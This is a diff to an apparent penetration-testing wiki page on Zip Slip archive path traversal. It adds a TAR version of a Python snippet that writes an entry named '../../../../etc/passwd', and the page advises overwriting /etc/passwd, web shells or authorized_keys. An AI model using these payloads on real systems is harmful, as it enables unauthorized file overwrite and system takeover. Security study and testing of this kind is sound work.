@@ -88,14 +88,20 @@ The main _pattern_ to look out for is:
 
 To test for and exploit such a vulnerability, simply create a file entry with a custom name:
 
-<pre class="language-python" data-title="Python"><code class="lang-python">import zipfile
+<pre class="language-python" data-title="Python (ZIP)"><code class="lang-python">import zipfile  # ZIP
 
 with zipfile.ZipFile("payload.zip", "w") as zip:
     #          source            name
 <strong>    zip.write("passwd", "../../../../etc/passwd")
 </strong></code></pre>
 
-The above example will create a ZIP file `payload.zip`, that when extracted by vulnerable, will try to overwrite `/etc/passwd`with the content you choose. This can be useful if `root` executes it for a Privilege Escalation scenario, but more commonly you'll want to get initial access by **overwriting executable files** like PHP shells, templates, dotfiles, or `~/.ssh/authorized_keys` if SSH is enabled (see [#writing-files](../linux/linux-privilege-escalation/#writing-files "mention") for more details).
+<pre class="language-python" data-title="Python (TAR)"><code class="lang-python">import tarfile
+
+with tarfile.TarFile("zipslip.tar", "w") as zip:
+<strong>    zip.add("passwd", "../../../../etc/passwd")
+</strong></code></pre>
+
+The above example will create a ZIP file `payload.zip`, that when extracted by vulnerable, will try to overwrite `/etc/passwd` with the content you choose. This can be useful if `root` executes it for a Privilege Escalation scenario, but more commonly you'll want to get initial access by **overwriting executable files** like PHP shells, templates, dotfiles, or `~/.ssh/authorized_keys` if SSH is enabled (see [#writing-files](../linux/linux-privilege-escalation/#writing-files "mention") for more details).
 
 ### Symlinks
 
